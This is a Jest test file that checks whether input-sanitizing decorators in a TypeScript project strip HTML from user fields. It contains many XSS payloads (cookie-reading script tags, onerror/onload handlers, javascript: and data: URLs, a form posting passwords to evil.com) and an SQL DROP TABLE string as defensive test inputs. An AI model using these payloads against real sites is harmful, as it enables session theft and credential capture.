import { Transform } from "class-transformer";
import { plainToClass } from "class-transformer";
import { validate, IsString, IsOptional } from "class-validator";
import {
  SanitizeString,
  SanitizeText,
} from "../../src/decorators/sanitize.decorator";

// Mock DTO para testing
class TestDto {
  @IsString()
  @SanitizeString()
  name: string;

  @IsOptional()
  @IsString()
  @SanitizeText()
  description?: string;
}

describe("XSS Sanitization Tests", () => {
  describe("SanitizeString Decorator", () => {
    it("should remove script tags from input", async () => {
      const input = { name: '<script>alert("XSS")</script>John Doe' };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).not.toContain("<script>");
      expect(dto.name).not.toContain("alert");
      expect(dto.name).toContain("John Doe");
    });

    it("should remove iframe tags", async () => {
      const input = { name: '<iframe src="evil.com"></iframe>Product Name' };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).not.toContain("<iframe>");
      expect(dto.name).not.toContain("evil.com");
      expect(dto.name).toContain("Product Name");
    });

    it("should remove onclick event handlers", async () => {
      const input = { name: "<img src=x onerror=\"alert('XSS')\">" };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).not.toContain("onerror");
      expect(dto.name).not.toContain("alert");
    });

    it("should remove javascript: URLs", async () => {
      const input = { name: "<a href=\"javascript:alert('XSS')\">Click</a>" };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).not.toContain("javascript:");
      expect(dto.name).not.toContain("alert");
    });

    it("should remove data: URLs with base64 scripts", async () => {
      const input = {
        name: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>',
      };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).not.toContain("<object>");
      expect(dto.name).not.toContain("data:");
    });

    it("should handle SQL injection attempts", async () => {
      const input = { name: "'; DROP TABLE users; --" };
      const dto = plainToClass(TestDto, input);

      // Sanitización debe remover caracteres peligrosos
      expect(dto.name).toBe("'; DROP TABLE users; --"); // Plain text, no HTML
    });

    it("should preserve safe HTML entities", async () => {
      const input = { name: "Price: $10 &amp; up" };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).toContain("Price:");
      expect(dto.name).toContain("$10");
    });

    it("should trim whitespace", async () => {
      const input = { name: "   Product Name   " };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).toBe("Product Name");
    });

    it("should handle empty strings", async () => {
      const input = { name: "" };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).toBe("");
    });

    it("should handle null/undefined gracefully", async () => {
      const input1 = { name: null };
      const input2 = { name: undefined };

      const dto1 = plainToClass(TestDto, input1);
      const dto2 = plainToClass(TestDto, input2);

      expect(dto1.name).toBeFalsy();
      expect(dto2.name).toBeUndefined();
    });
  });

  describe("SanitizeText Decorator (NOTE: Current implementation removes all HTML)", () => {
    it("should remove all HTML tags including safe ones (current behavior)", async () => {
      const input = {
        description: "<p>This is <b>bold</b> and <i>italic</i> text</p>",
      };
      const dto = plainToClass(TestDto, input);

      // Current implementation strips ALL HTML
      expect(dto.description).not.toContain("<p>");
      expect(dto.description).not.toContain("<b>");
      expect(dto.description).not.toContain("<i>");
      expect(dto.description).toContain("This is");
      expect(dto.description).toContain("bold");
      expect(dto.description).toContain("italic");
    });

    it("should remove script tags from text fields", async () => {
      const input = {
        description: '<p>Normal text</p><script>alert("XSS")</script>',
      };
      const dto = plainToClass(TestDto, input);

      expect(dto.description).not.toContain("<script>");
      expect(dto.description).not.toContain("alert");
      expect(dto.description).toContain("Normal text");
    });

    it("should remove dangerous attributes along with tags", async () => {
      const input = {
        description: "<p onclick=\"alert('XSS')\">Text</p>",
      };
      const dto = plainToClass(TestDto, input);

      expect(dto.description).toContain("Text");
      expect(dto.description).not.toContain("onclick");
      expect(dto.description).not.toContain("<p>");
    });

    // TODO: Future enhancement - allow safe HTML tags with whitelist
    it.skip("should allow safe HTML tags in future (not yet implemented)", async () => {
      // This test is for future reference when we implement
      // selective HTML tag whitelisting in SanitizeText
    });
  });

  describe("Real-world XSS Attack Vectors", () => {
    const attackVectors = [
      {
        name: "Classic XSS",
        payload: "<script>alert(document.cookie)</script>",
        shouldNotContain: ["<script>", "alert", "document.cookie"],
      },
      {
        name: "IMG onerror",
        payload: "<img src=x onerror=alert(1)>",
        shouldNotContain: ["onerror", "alert"],
      },
      {
        name: "SVG XSS",
        payload: "<svg onload=alert(1)>",
        shouldNotContain: ["<svg", "onload", "alert"],
      },
      {
        name: "Event handler XSS",
        payload: "<body onload=alert(1)>",
        shouldNotContain: ["onload", "alert"],
      },
      // NOTE: Markdown links are not HTML, so they're not sanitized by sanitize-html
      // They should be handled at the rendering layer (don't use markdown parser on user input)
      // {
      //   name: 'Markdown injection',
      //   payload: '[Click me](javascript:alert(1))',
      //   shouldNotContain: ['javascript:', 'alert'],
      // },
      {
        name: "Base64 encoded script",
        payload:
          '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        shouldNotContain: ["<iframe", "data:text/html"],
      },
      {
        name: "Meta tag redirect",
        payload:
          '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        shouldNotContain: ["<meta", "javascript:"],
      },
      {
        name: "Form hijacking",
        payload:
          '<form action="https://evil.com"><input name="password"></form>',
        shouldNotContain: ["<form", "evil.com"],
      },
    ];

    attackVectors.forEach(({ name, payload, shouldNotContain }) => {
      it(`should block: ${name}`, () => {
        const input = { name: payload };
        const dto = plainToClass(TestDto, input);

        shouldNotContain.forEach((dangerous) => {
          expect(dto.name.toLowerCase()).not.toContain(dangerous.toLowerCase());
        });
      });
    });
  });

  describe("Performance Tests", () => {
    it("should handle large inputs efficiently", () => {
      const largeInput = "A".repeat(10000) + "<script>alert(1)</script>";
      const input = { name: largeInput };

      const startTime = Date.now();
      const dto = plainToClass(TestDto, input);
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(100); // Should be < 100ms
      expect(dto.name).not.toContain("<script>");
    });

    it("should handle multiple transformations in batch", () => {
      const inputs = Array.from({ length: 100 }, (_, i) => ({
        name: `Product ${i} <script>alert(${i})</script>`,
      }));

      const startTime = Date.now();
      const dtos = inputs.map((input) => plainToClass(TestDto, input));
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(500); // Should be < 500ms for 100 items
      dtos.forEach((dto) => {
        expect(dto.name).not.toContain("<script>");
      });
    });
  });

  describe("Edge Cases", () => {
    it("should handle unicode characters", () => {
      const input = { name: "Café ☕ Niño 中文" };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).toBe("Café ☕ Niño 中文");
    });

    it("should handle special characters in product names", () => {
      const input = { name: "Product @ $10 & 20% off!" };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).toContain("@");
      expect(dto.name).toContain("$10");
      expect(dto.name).toContain("20%");
    });

    it("should handle HTML entities correctly", () => {
      const input = { name: "&lt;script&gt;alert(1)&lt;/script&gt;" };
      const dto = plainToClass(TestDto, input);

      // Should NOT decode HTML entities (prevent double-encoding attacks)
      expect(dto.name).not.toContain("<script>");
    });

    it("should handle nested HTML tags", () => {
      const input = {
        name: "<div><span><script>alert(1)</script></span></div>Text",
      };
      const dto = plainToClass(TestDto, input);

      expect(dto.name).not.toContain("<div>");
      expect(dto.name).not.toContain("<script>");
      expect(dto.name).toContain("Text");
    });
  });
});
